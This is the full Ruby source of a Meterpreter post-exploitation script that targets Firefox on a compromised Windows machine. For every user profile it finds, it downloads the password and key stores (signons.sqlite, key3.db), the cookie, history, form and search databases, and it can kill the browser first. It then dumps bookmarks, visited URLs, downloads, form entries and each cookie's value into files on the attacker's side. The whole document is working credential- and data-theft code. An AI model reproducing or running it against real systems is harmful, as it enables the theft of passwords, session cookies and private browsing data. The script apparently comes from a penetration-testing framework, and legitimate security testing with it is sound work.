#
# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
################## Variable Declarations ##################
require 'sqlite3'
@client = client
kill_frfx = false
host,port = session.session_host, session.session_port
# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

# Create a directory for the logs
@logs = ::File.join(Msf::Config.config_directory, 'logs',"scripts", 'enum_firefox', host + filenameinfo )

# logfile name
logfile = @logs + "/" + host + filenameinfo + ".txt"
notusrs = [
	"Default",
	"Default User",
	"Public",
	"LocalService",
	"NetworkService",
	"All Users"
]
#-------------------------------------------------------------------------------
#Function for getting Firefox SQLite DB's
def frfxplacesget(path,usrnm)
	# Create the log
	::FileUtils.mkdir_p(@logs)
	@client.fs.dir.foreach(path) {|x|
		next if x =~ /^(\.|\.\.)$/
		fullpath = path + '\\' + x
		if @client.fs.file.stat(fullpath).directory?
			frfxplacesget(fullpath,usrnm)
		elsif fullpath =~ /(formhistory.sqlite|cookies.sqlite|places.sqlite|search.sqlite)/i
			dst = x
			dst = @logs + ::File::Separator + usrnm + dst
			print_status("\tDownloading Firefox Database file #{x} to '#{dst}'")
			@client.fs.file.download_file(dst, fullpath)
		end
	}

end
#-------------------------------------------------------------------------------
#Function for processing the Firefox sqlite DB's
def frfxdmp(usrnm)
	sitesvisited = []
	dnldsmade = []
	bkmrks = []
	cookies = []
	formvals = ''
	searches = ''
	results = ''
	placesdb = @logs + ::File::Separator + usrnm + "places.sqlite"
	formdb = @logs + ::File::Separator + usrnm + "formhistory.sqlite"
	searchdb = @logs + ::File::Separator + usrnm + "search.sqlite"
	cookiesdb = @logs + ::File::Separator + usrnm + "cookies.sqlite"
	bookmarks = @logs + ::File::Separator + usrnm + "_bookmarks.txt"
	download_list = @logs + ::File::Separator + usrnm + "_download_list.txt"
	url_history = @logs + ::File::Separator + usrnm + "_history.txt"
	form_history = @logs + ::File::Separator + usrnm + "_form_history.txt"
	search_history = @logs + ::File::Separator + usrnm + "_search_history.txt"
	begin
		print_status("\tGetting Firefox Bookmarks for #{usrnm}")
		db = SQLite3::Database.new(placesdb)
		#print_status("\tProcessing #{placesdb}")

		db.execute('select a.url from moz_places a, moz_bookmarks b, '+
			'moz_bookmarks_roots c where a.id=b.fk and parent=2'+
			' and folder_id=2 and a.hidden=0') do |row|
			bkmrks << row
		end
		print_status("\tSaving to #{bookmarks}")
		if bkmrks.length != 0
			bkmrks.each do |b|
				file_local_write(bookmarks,"\t#{b.to_s}\n")
			end
		else
			print_status("\tIt appears that there are no bookmarks for this account")
		end
	rescue::Exception => e
		print_status("The following Error was encountered: #{e.class} #{e}")
	end
	#--------------------------------------------------------------------------
	begin
		print_status("\tGetting list of Downloads using Firefox made by #{usrnm}")
		db.execute('SELECT url FROM moz_places, moz_historyvisits ' +
			'WHERE moz_places.id = moz_historyvisits.place_id '+
			'AND visit_type = "7" ORDER by visit_date') do |row|
			dnldsmade << row
		end
		print_status("\tSaving Download list to #{download_list}")
		if dnldsmade.length != 0
			dnldsmade.each do |d|
				file_local_write(download_list,"\t#{d.to_s} \n")
			end
		else
			print_status("\tIt appears that downloads where cleared for this account")
		end
	rescue::Exception => e
		print_status("The following Error was encountered: #{e.class} #{e}")
	end
	#--------------------------------------------------------------------------
	begin
		print_status("\tGetting Firefox URL History for #{usrnm}")
		db.execute('SELECT DISTINCT url FROM moz_places, moz_historyvisits ' +
			'WHERE moz_places.id = moz_historyvisits.place_id ' +
			'AND visit_type = "1" ORDER by visit_date' ) do |row|
			sitesvisited << row
		end
		print_status("\tSaving URL History to #{url_history}")
		if sitesvisited.length != 0
			sitesvisited.each do |s|
				file_local_write(url_history,"\t#{s.to_s}\n")
			end
		else
			print_status("\tIt appears that Browser History has been cleared")
		end
		db.close
	rescue::Exception => e
		print_status("The following Error was encountered: #{e.class} #{e}")
	end
	#--------------------------------------------------------------------------
	begin
		print_status("\tGetting Firefox Form History for #{usrnm}")
		db = SQLite3::Database.new(formdb)
		#print_status("\tProcessing #{formdb}")
		db.execute("SELECT fieldname,value FROM moz_formhistory") do |row|
			formvals << "\tField: #{row[0]} Value: #{row[1]}\n"
		end
		print_status("\tSaving Firefox Form History to #{form_history}")
		if formvals.length != 0
			file_local_write(form_history,formvals)
		else
			print_status("\tIt appears that Form History has been cleared")
		end
		db.close
	rescue::Exception => e
		print_status("The following Error was encountered: #{e.class} #{e}")
	end

	begin
		print_status("\tGetting Firefox Search History for #{usrnm}")
		db = SQLite3::Database.new(searchdb)
		#print_status("\tProcessing #{searchdb}")
		db.execute("SELECT name,value FROM engine_data") do |row|
			searches << "\tField: #{row[0]} Value: #{row[1]}\n"
		end
		print_status("\tSaving Firefox Search History to #{search_history}")
		if searches.length != 0
			file_local_write(search_history,searches)
		else
			print_status("\tIt appears that Search History has been cleared")
		end
		db.close
	rescue::Exception => e
		print_status("The following Error was encountered: #{e.class} #{e}")
	end
	# Create Directory for dumping Firefox cookies
	ckfldr = ::File.join(@logs,"firefoxcookies_#{usrnm}")
	::FileUtils.mkdir_p(ckfldr)
	db = SQLite3::Database.new(cookiesdb)
	db.results_as_hash = true
	print_status("\tGetting Firefox Cookies for #{usrnm}")
	db.execute("SELECT * FROM moz_cookies;" ) do |item|
		fd = ::File.new(ckfldr + ::File::Separator + item['id'].to_s + "_" + item['host'].to_s + ".txt", "w+")
		fd.puts "Name: " + item['name'] + "\n"
		fd.puts "Value: " + item['value'].to_s + "\n"
		fd.puts "Host: " + item['host'] + "\n"
		fd.puts "Path: " + item['path'] + "\n"
		fd.puts "Expiry: " + item['expiry'].to_s + "\n"
		fd.puts "lastAccessed: " + item['lastAccessed'].to_s + "\n"
		fd.puts "isSecure: " + item['isSecure'].to_s + "\n"
		fd.puts "isHttpOnly: " + item['isHttpOnly'].to_s + "\n"
		fd.close
	end
	return results
end
#-------------------------------------------------------------------------------
#Function for getting password files
def frfxpswd(path,usrnm)
	@client.fs.dir.foreach(path) {|x|
		next if x =~ /^(\.|\.\.)$/
		fullpath = path + '\\' + x

		if @client.fs.file.stat(fullpath).directory?
			frfxpswd(fullpath,usrnm)
		elsif fullpath =~ /(cert8.db|signons.sqlite|signons3.txt|key3.db)/i
			begin
				dst = x
				dst = @logs + ::File::Separator + usrnm + dst
				print_status("\tDownloading Firefox Password file to '#{dst}'")
				@client.fs.file.download_file(dst, fullpath)
			rescue
				print_error("\t******Failed to download file #{x}******")
				print_error("\t******Browser could be running******")
			end
		end
	}

end
#-------------------------------------------------------------------------------
# Function for checking if Firefox is installed
def frfxchk
	found = false
	registry_enumkeys("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall").each do |a|
		if a =~ /Firefox/
			print_status("Firefox was found on this system.")
			found = true
		end
	end
	return found
end
#-------------------------------------------------------------------------------
#Function for executing all pilfering actions for Firefox
def frfxpilfer(frfoxdbloc,session,logs,usrnm,logfile)
	print_status("Getting Firefox information for user #{usrnm}")
	frfxplacesget(frfoxdbloc,usrnm)
	frfxpswd(frfoxdbloc,usrnm)
	file_local_write(logfile,frfxdmp(usrnm))
end

# Function to kill Firefox if open
def kill_firefox
	print_status("Killing the Firefox Process if open...")
	@client.sys.process.get_processes().each do |x|
		if x['name'].downcase == "firefox.exe"
			print_status("\tFirefox Process found #{x['name']} #{x['pid']}")
			print_status("\tKilling process .....")
			session.sys.process.kill(x['pid'])
		end
	end
end
####################### Options ###########################
@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ],
	"-k" => [ false, "Kill Firefox processes before downloading databases for enumeration."]

)
@@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		print_line "Meterpreter Script for extracting Firefox Browser."
		print_line(@@exec_opts.usage)
		raise Rex::Script::Completed
	when "-k"
		kill_frfx = true
	end
}
if client.platform =~ /win32|win64/
	if frfxchk
		user = @client.sys.config.getuid
		if not is_system?
			usrname = Rex::FileUtils.clean_path(@client.fs.file.expand_path("%USERNAME%"))
			db_path = @client.fs.file.expand_path("%APPDATA%") + "\\Mozilla\\Firefox\\Profiles"
			if kill_frfx
				kill_firefox
			end
			print_status("Extracting Firefox data for user #{usrname}")
			frfxpswd(db_path,usrname)
			frfxplacesget(db_path,usrname)
			frfxdmp(usrname)
		else
			registry_enumkeys("HKU").each do |sid|
				if sid =~ /S-1-5-21-\d*-\d*-\d*-\d{4}$/
					key_base = "HKU\\#{sid}"
					usrname = Rex::FileUtils.clean_path(registry_getvaldata("#{key_base}\\Volatile Environment","USERNAME"))
					db_path = registry_getvaldata("#{key_base}\\Volatile Environment","APPDATA") + "\\Mozilla\\Firefox\\Profiles"
					if kill_frfx
						kill_firefox
					end
					print_status("Extracting Firefox data for user #{usrname}")
					frfxpswd(db_path,usrname)
					frfxplacesget(db_path,usrname)
					frfxdmp(usrname)
				end
			end
		end

	end
else
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end
